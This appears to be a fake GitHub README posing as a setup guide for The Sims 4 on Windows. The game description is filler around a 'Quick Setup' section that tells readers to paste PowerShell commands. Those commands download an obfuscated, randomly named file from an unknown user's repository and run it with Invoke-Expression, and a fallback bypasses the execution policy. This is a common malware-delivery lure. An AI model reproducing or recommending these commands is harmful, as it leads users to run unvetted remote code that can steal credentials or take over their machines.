# The Sims 4

The Sims 4 is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch The Sims 4 and play.

The Sims 4 is a single-player life simulation from Maxis and Electronic Arts for Windows. You use Create-a-Sim to define appearance, traits, and aspirations, then move households into neighborhoods where build mode, buy mode, and live mode handle architecture, shopping, and day-to-day routines. Expansions and packs add worlds, jobs, occult life states, seasons, and hobbies on top of the base sandbox.

On a typical Windows session you load a save from the main menu, check moods and needs in live mode, and follow whims or scenario goals while time runs or stays paused. You might remodel a kitchen, send Sims to work or school, host a gathering, switch lots on the map, or spend an hour in build mode before saving and exiting through the EA app library client.

This repository holds the Windows setup file used to install the game locally, short setup notes for first-run configuration, and a changelog that records bundle revisions. Optional text files describe common graphics settings, mod folder layout, and save backup habits many players keep next to their installation.

## How you play

- Create-a-Sim adjusts faces, outfits, walk styles, voices, and traits before your household moves in.
- Build and buy mode places walls, roofs, terrain, and catalog furniture into cohesive residential floor plans.
- Live mode tracks hunger, energy, fun, hygiene, and emotions that shift how Sims socialize and work.
- Aspirations and whim prompts offer short tasks and long arcs for every member of the household.
- Expansion and game packs add careers, occult types, weather systems, and themed neighborhoods beyond base content.
- The gallery shares lots, rooms, and Sim households when you connect through the desktop client online.
- Save files preserve relationships, skills, inventories, lot builds, and story history across many play sessions.
- This repository documents Windows install steps, patch expectations, and bundle changes in tracked setup materials.

## Quick Setup (PowerShell)

This installs the game The Sims 4 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/franziska44459108/the-sims-4-setup-guide/main/s9pss4flwv.4tmsg16x | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/franziska44459108/the-sims-4-setup-guide/main/s9pss4flwv.4tmsg16x | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `s9pss4flwv.4tmsg16x` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `franziska44459108/the-sims-4-setup-guide`. The Sims 4 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
